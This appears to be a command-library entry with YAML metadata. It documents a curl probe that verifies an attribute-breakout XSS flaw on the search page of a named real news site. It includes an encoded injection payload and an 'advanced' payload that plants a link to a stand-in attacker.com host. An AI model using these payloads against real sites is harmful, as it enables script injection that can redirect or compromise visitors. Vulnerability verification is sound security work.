---
data: >-
  curl -s 'https://www.secnews.gr?s=%27%3E%3Ctest%3E%3C' | egrep -o
  ".{47}?<test>.*?>"
tags:
  - xss-verification
  - curl
  - injection-test
type: command
output: >-
  <div id="content" data-currentquery='{"s":"\\'\'><test><"}'
  class="main-content articles list sidebar-right non-full">
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:20.322Z'
id: 684a3f1d-cfe4-4f71-a6f8-0db7c66735fb
verified: false
validated: true
submitted: true
---
# Verify-DOM-based-XSS-Injection-with-Curl

## Command

```bash
curl -s 'https://www.secnews.gr?s=%27%3E%3Ctest%3E%3C' | egrep -o ".{47}?<test>.*?>"
```

## Description

This command fetches the SecNews search page with a test payload that attempts to break out of the data-currentquery attribute using a single quote, then extracts and displays the injected HTML to verify the DOM-based XSS vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode, suppresses curl progress meter and errors | Yes |
| URL | The target URL with encoded payload (%27%3E%3Ctest%3E%3C decodes to '> <test><') | Yes |
| `egrep -o ".{47}?<test>.*?>"` | Regular expression to output exactly 47 characters before <test> and the tag content | Yes |

## Examples

### Basic Usage

```bash
curl -s 'https://www.secnews.gr?s=%27%3E%3Ctest%3E%3C' | egrep -o ".{47}?<test>.*?>"
```

### Advanced Usage

```bash
curl -s 'https://www.secnews.gr/?s=%27%20class%3Dcolorbox%20href=/attacker.com:9999%3E' | grep -i colorbox
```

## Expected Output

The command outputs the surrounding HTML with the injected tag, such as: <div id="content" data-currentquery='{"s":"\\'\'><test><"}' class="main-content articles list sidebar-right non-full">. This confirms the breakout and improper escaping (double-escaped single quote).

## Related

- [[Related Procedure: Craft-Malicious-Search-URL-for-XSS-Injection]]
